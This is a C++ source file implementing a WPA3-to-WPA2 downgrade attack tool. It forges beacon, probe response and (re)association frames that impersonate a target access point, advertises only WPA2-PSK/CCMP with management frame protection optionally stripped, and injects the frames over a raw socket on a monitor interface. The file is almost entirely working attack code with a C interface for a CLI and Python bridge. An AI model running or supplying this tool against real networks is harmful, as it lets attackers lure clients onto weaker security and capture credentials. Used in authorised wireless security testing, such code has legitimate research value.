// WPA3 -> WPA2 downgrade engine. See wpa3_downgrade_engine.h.
//
// Threat model: transition-mode WPA3 (SAE + PSK) deployments that don't require
// PMF. The engine impersonates the AP with RSN IE advertising only PSK/CCMP
// and (optionally) no MFP. Classification/reporting lives in the Python layer;
// this file emits frames and injects them.

#include "wpa3_downgrade_engine.h"

#include <atomic>
#include <chrono>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <string>
#include <thread>
#include <vector>

#ifdef __linux__
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <linux/wireless.h>
#endif

namespace w3d {

// ---- mac parsing --------------------------------------------------------
bool Mac::Parse(const std::string& s, Mac& out) {
    unsigned v[6];
    char sep;
    if (std::sscanf(s.c_str(), "%2x%c%2x%c%2x%c%2x%c%2x%c%2x",
                    &v[0], &sep, &v[1], &sep, &v[2], &sep,
                    &v[3], &sep, &v[4], &sep, &v[5]) != 11) {
        return false;
    }
    for (int i = 0; i < 6; ++i) out.b[i] = static_cast<uint8_t>(v[i]);
    return true;
}

std::string Mac::Str() const {
    char buf[18];
    std::snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
                  b[0], b[1], b[2], b[3], b[4], b[5]);
    return std::string(buf);
}

// ---- frame helpers ------------------------------------------------------
namespace {

inline void Put16(std::vector<uint8_t>& v, uint16_t x) {
    v.push_back(static_cast<uint8_t>(x & 0xff));
    v.push_back(static_cast<uint8_t>((x >> 8) & 0xff));
}

inline void PutMac(std::vector<uint8_t>& v, const Mac& m) {
    v.insert(v.end(), m.b, m.b + 6);
}

// 802.11 management header for a Beacon/Probe Response.
// frame_control: subtype in bits 4..7 of first byte. we always emit version=0,
// type=0 (management).
void WriteMgmtHeader(std::vector<uint8_t>& v, uint8_t subtype,
                     const Mac& da, const Mac& sa, const Mac& bssid,
                     uint16_t seq) {
    v.push_back(static_cast<uint8_t>((subtype << 4) & 0xf0));
    v.push_back(0x00);
    v.push_back(0x00);              // duration
    PutMac(v, da);
    PutMac(v, sa);
    PutMac(v, bssid);
    Put16(v, static_cast<uint16_t>((seq & 0x0fff) << 4));  // sequence control
    // 8 zero bytes timestamp (for Beacon / Probe Response / Assoc response
    // fixed fields). We write them here so body writing is uniform.
}

void WriteBeaconFixed(std::vector<uint8_t>& v, const DowngradeConfig& cfg) {
    // 8 bytes timestamp (already reserved) + beacon interval + capability
    Put16(v, cfg.beacon_interval);
    // Capability info: ESS (bit 0) | Privacy (bit 4). Privacy set => encryption
    // on so clients treat this as a secured BSS.
    uint16_t cap = 0x0001 | 0x0010;
    if (cfg.include_ht) cap |= 0x0020;  // HT capable
    Put16(v, cap);
}

// Supported rates element (mandatory in Beacon).
void WriteSupportedRates(std::vector<uint8_t>& v, bool ht) {
    if (ht) {
        v.push_back(0x01);  // element id
        v.push_back(0x08);
        static const uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96,
                                         0x0c, 0x12, 0x18, 0x24};
        v.insert(v.end(), rates, rates + 8);
    } else {
        v.push_back(0x01);
        v.push_back(0x04);
        static const uint8_t rates[4] = {0x82, 0x84, 0x8b, 0x96};
        v.insert(v.end(), rates, rates + 4);
    }
}

}  // namespace

// ---- RSN IE -------------------------------------------------------------
// Wire layout of the trimmed RSN IE we emit:
//   Element ID 0x30 | Length | Version(2) | Group cipher(4) |
//   Pairwise count(2) | Pairwise cipher(4) | AKM count(2) | AKM(4) |
//   RSN Capabilities(2) | [PMKID count(2) + PMKID(s)] | [Group Mgmt Cipher(4)]
//
// We intentionally do NOT append PMKIDs or MFP ciphers — the whole point of
// the downgrade is to make the BSS look like plain WPA2-PSK/CCMP.
std::vector<uint8_t> BuildDowngradedRsnIe(const DowngradeConfig& cfg) {
    std::vector<uint8_t> ie;
    std::vector<uint8_t> body;

    Put16(body, 0x0001);                        // version 1
    // Group cipher: CCMP 128 (00:0f:ac:04)
    body.insert(body.end(), {0x00, 0x0f, 0xac, 0x04});
    Put16(body, 1);                             // pairwise count
    body.insert(body.end(), {0x00, 0x0f, 0xac, 0x04});  // pairwise CCMP
    Put16(body, 1);                             // AKM count
    body.insert(body.end(), {0x00, 0x0f, 0xac,
                             static_cast<uint8_t>(cfg.akm)});

    uint16_t rsn_caps = 0;
    if (!cfg.strip_pmf) {
        rsn_caps |= 0x0080;  // MFP capable (bit 7)
        rsn_caps |= 0x0040;  // MFP required (bit 6)
    }
    Put16(body, rsn_caps);

    ie.push_back(0x30);                         // element id RSN
    ie.push_back(static_cast<uint8_t>(body.size()));
    ie.insert(ie.end(), body.begin(), body.end());
    return ie;
}

// ---- Beacon -------------------------------------------------------------
std::vector<uint8_t> BuildBeacon(const DowngradeConfig& cfg) {
    const Mac bcast{{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}};
    std::vector<uint8_t> f;
    f.reserve(256);
    WriteMgmtHeader(f, 0x08 /*beacon*/, bcast, cfg.source, cfg.bssid, cfg.seq);
    f.insert(f.end(), 8, 0);  // timestamp placeholder (filled by write below)
    WriteBeaconFixed(f, cfg);

    // SSID
    size_t ssid_len = cfg.ssid.size();
    if (ssid_len > 32) ssid_len = 32;
    f.push_back(0x00);
    f.push_back(static_cast<uint8_t>(ssid_len));
    f.insert(f.end(), cfg.ssid.data(), cfg.ssid.data() + ssid_len);

    WriteSupportedRates(f, cfg.include_ht);

    // DS Parameter (channel)
    f.push_back(0x03);
    f.push_back(0x01);
    f.push_back(cfg.channel);

    // RSN IE (downgraded)
    auto rsn = BuildDowngradedRsnIe(cfg);
    f.insert(f.end(), rsn.begin(), rsn.end());

    if (cfg.include_wmm) {
        // WMM / WMM Parameter (vendor element 221, OUI 00:50:f2:02)
        static const uint8_t wmm[] = {
            0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01,
            0x80, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
            0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32,
            0x2f, 0x00,
        };
        f.insert(f.end(), wmm, wmm + sizeof(wmm));
    }

    if (cfg.include_ht) {
        // HT Capabilities (short) + HT Operation (minimal) — clients only need
        // a plausible HT presence to consider the beacon valid on 2.4GHz.
        static const uint8_t htcap[] = {
            0x2d, 0x1a, 0xef, 0x09, 0x1b, 0xff, 0xff, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
        };
        f.insert(f.end(), htcap, htcap + sizeof(htcap));
        static const uint8_t htinfo[] = {
            0x3d, 0x16, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        };
        f.insert(f.end(), htinfo, htinfo + sizeof(htinfo));
    }

    return f;
}

// ---- Probe Response -----------------------------------------------------
std::vector<uint8_t> BuildProbeResponse(const DowngradeConfig& cfg,
                                        const Mac& dest) {
    std::vector<uint8_t> f;
    WriteMgmtHeader(f, 0x05 /*probe resp*/, dest, cfg.source, cfg.bssid, cfg.seq);
    f.insert(f.end(), 8, 0);
    WriteBeaconFixed(f, cfg);

    size_t ssid_len = cfg.ssid.size();
    if (ssid_len > 32) ssid_len = 32;
    f.push_back(0x00);
    f.push_back(static_cast<uint8_t>(ssid_len));
    f.insert(f.end(), cfg.ssid.data(), cfg.ssid.data() + ssid_len);

    WriteSupportedRates(f, cfg.include_ht);
    f.push_back(0x03);
    f.push_back(0x01);
    f.push_back(cfg.channel);

    auto rsn = BuildDowngradedRsnIe(cfg);
    f.insert(f.end(), rsn.begin(), rsn.end());
    return f;
}

// ---- (Re)Association Response ------------------------------------------
std::vector<uint8_t> BuildAssocResponse(const DowngradeConfig& cfg,
                                        const Mac& dest,
                                        uint16_t status_code) {
    std::vector<uint8_t> f;
    WriteMgmtHeader(f, 0x01 /*assoc resp*/, dest, cfg.source, cfg.bssid, cfg.seq);
    Put16(f, 0x0001);              // capability info (ESS + Privacy)
    Put16(f, status_code);         // status
    Put16(f, 0x0001);              // AID
    WriteSupportedRates(f, cfg.include_ht);
    auto rsn = BuildDowngradedRsnIe(cfg);
    f.insert(f.end(), rsn.begin(), rsn.end());
    return f;
}

std::vector<uint8_t> BuildReassocResponse(const DowngradeConfig& cfg,
                                          const Mac& dest,
                                          uint16_t status_code) {
    std::vector<uint8_t> f;
    WriteMgmtHeader(f, 0x03 /*reassoc resp*/, dest, cfg.source, cfg.bssid, cfg.seq);
    Put16(f, 0x0001);
    Put16(f, status_code);
    Put16(f, 0x0001);
    WriteSupportedRates(f, cfg.include_ht);
    auto rsn = BuildDowngradedRsnIe(cfg);
    f.insert(f.end(), rsn.begin(), rsn.end());
    return f;
}

// ---- injector -----------------------------------------------------------
DowngradeInjector::DowngradeInjector() = default;
DowngradeInjector::~DowngradeInjector() { Close(); }

bool DowngradeInjector::Open(const std::string& iface, uint8_t channel) {
#ifdef __linux__
    iface_ = iface;
    fd_ = ::socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd_ < 0) return false;

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    if (::ioctl(fd_, SIOCGIFINDEX, &ifr) < 0) {
        Close();
        return false;
    }

    struct sockaddr_ll sll;
    std::memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (::bind(fd_, reinterpret_cast<struct sockaddr*>(&sll), sizeof(sll)) < 0) {
        Close();
        return false;
    }
    SetChannel(iface, channel);
    return true;
#else
    (void)iface; (void)channel;
    return false;
#endif
}

void DowngradeInjector::Close() {
#ifdef __linux__
    if (fd_ >= 0) {
        ::close(fd_);
        fd_ = -1;
    }
#endif
}

bool DowngradeInjector::Send(const std::vector<uint8_t>& frame) {
#ifdef __linux__
    if (fd_ < 0) return false;
    struct sockaddr_ll sll;
    std::memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = static_cast<int>(if_nametoindex(iface_.c_str()));
    sll.sll_halen = 6;
    sll.sll_protocol = htons(ETH_P_ALL);
    const Mac bcast{{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}};
    std::memcpy(sll.sll_addr, bcast.b, 6);
    ssize_t n = ::sendto(fd_, frame.data(), frame.size(), 0,
                         reinterpret_cast<struct sockaddr*>(&sll), sizeof(sll));
    if (n < 0) {
        errors_++;
        return false;
    }
    sent_++;
    return true;
#else
    (void)frame;
    return false;
#endif
}

bool DowngradeInjector::SendBeacon(const DowngradeConfig& cfg) {
    return Send(BuildBeacon(cfg));
}

bool DowngradeInjector::SendProbeResponse(const DowngradeConfig& cfg,
                                          const Mac& dest) {
    return Send(BuildProbeResponse(cfg, dest));
}

bool DowngradeInjector::SendAssocResponse(const DowngradeConfig& cfg,
                                          const Mac& dest, bool reassoc,
                                          uint16_t status) {
    return Send(reassoc ? BuildReassocResponse(cfg, dest, status)
                        : BuildAssocResponse(cfg, dest, status));
}

// ---- channel control ----------------------------------------------------
bool SetChannel(const std::string& iface, uint16_t value, bool is_mhz) {
#ifdef __linux__
    // 2.4 GHz channels 1..14 map to 2412 + 5*(ch-1) MHz. We accept either.
    uint16_t mhz = value;
    if (!is_mhz) {
        if (value >= 1 && value <= 14) mhz = static_cast<uint16_t>(2412 + 5 * (value - 1));
        else if (value >= 36 && value <= 177) mhz = static_cast<uint16_t>(5000 + 5 * value);
    }

    int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;
    struct iwreq wrq;
    std::memset(&wrq, 0, sizeof(wrq));
    std::strncpy(wrq.ifr_name, iface.c_str(), IFNAMSIZ - 1);
    double freq = static_cast<double>(mhz) / 1000.0;  // GHz
    wrq.u.freq.m = static_cast<__s32>(freq * 1e9);
    wrq.u.freq.e = 0;
    wrq.u.freq.flags = IW_FREQ_FIXED;
    bool ok = ::ioctl(fd, SIOCSIWFREQ, &wrq) == 0;
    ::close(fd);
    return ok;
#else
    (void)iface; (void)value; (void)is_mhz;
    return false;
#endif
}

}  // namespace w3d

// =========================================================================
// C facade: the CLI and the ctypes bridge both go through here so the state
// machine (thread + stop flag) lives in one place.
// =========================================================================
namespace {
std::atomic<bool> g_running{false};
std::atomic<uint64_t> g_sent{0};
std::atomic<uint64_t> g_errors{0};
std::thread g_worker;
}  // namespace

extern "C" {

W3D_API int w3d_run(const char* iface, const char* bssid, const char* ssid,
                    int channel, int duration_sec, int strip_pmf,
                    int beacon_rate_ms) {
    using namespace w3d;
    if (!iface || !bssid || !ssid) return -2;
    if (g_running.exchange(true)) return -1;  // already running

    DowngradeConfig cfg;
    if (!Mac::Parse(bssid, cfg.bssid)) { g_running = false; return -3; }
    cfg.source = cfg.bssid;
    cfg.ssid = ssid;
    cfg.channel = static_cast<uint8_t>(channel);
    cfg.strip_pmf = strip_pmf != 0;

    auto* inj = new DowngradeInjector();
    if (!inj->Open(iface, cfg.channel)) {
        delete inj;
        g_running = false;
        return -4;  // socket/bind failed (need CAP_NET_RAW + monitor iface)
    }

    if (beacon_rate_ms < 10) beacon_rate_ms = 10;

    g_worker = std::thread([inj, cfg, duration_sec, beacon_rate_ms]() {
        auto start = std::chrono::steady_clock::now();
        auto period = std::chrono::milliseconds(beacon_rate_ms);
        uint16_t seq = 0;
        while (g_running.load()) {
            DowngradeConfig local = cfg;
            local.seq = seq++;
            inj->SendBeacon(local);
            g_sent = inj->Sent();
            g_errors = inj->Errors();
            if (duration_sec > 0) {
                auto elapsed = std::chrono::steady_clock::now() - start;
                if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count()
                        >= duration_sec) {
                    g_running = false;
                    break;
                }
            }
            std::this_thread::sleep_for(period);
        }
        inj->Close();
        delete inj;
    });
    return 0;
}

W3D_API void w3d_stop(void) {
    g_running = false;
    if (g_worker.joinable()) g_worker.join();
}

W3D_API unsigned long long w3d_sent(void) { return g_sent.load(); }
W3D_API unsigned long long w3d_errors(void) { return g_errors.load(); }

}  // extern "C"
